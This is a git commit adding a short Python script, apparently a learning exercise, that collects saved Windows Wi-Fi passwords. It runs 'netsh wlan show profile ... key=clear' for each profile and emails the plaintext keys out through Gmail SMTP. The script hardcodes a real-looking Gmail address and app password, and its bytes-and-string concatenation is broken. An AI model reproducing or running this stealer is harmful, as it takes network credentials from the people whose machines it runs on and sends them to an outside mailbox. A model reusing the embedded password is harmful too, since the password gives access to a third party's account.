a13139e138d2bb442dd93c691a6826910cdf6394
Szymon Łondka <szymon.londka@gmail.com>
2023-02-20 21:11:53 +0100

    base python file

---
+++ task.py
@@ -0,0 +1,27 @@
+#!/usr/bin/env python
+
+import subprocess, smtplib, re
+
+
+def send_mail(email, password, message):
+    server = smtplib.SMTP("smtp.gmail.com", 587)
+    server.starttls()
+    server.login(email, password)
+    server.sendmail(email, email, message)
+    server.quit()
+
+
+command = "netsh wlan show profile"
+
+networks = subprocess.check_output(command, shell=True)
+networks_name_list = re.findall("(?:Profile\s*:\s)(.*)", str(networks))
+
+print(networks_name_list)
+
+result = ""
+for network_name in networks_name_list:
+    command = "netsh wlan show profile " + network_name + " key=clear"
+    current_result = subprocess.check_output(command, shell=True)
+    result = result + current_result
+
+send_mail("szymon.londka@gmail.com", "tufxtmigajgjxqsv", result)
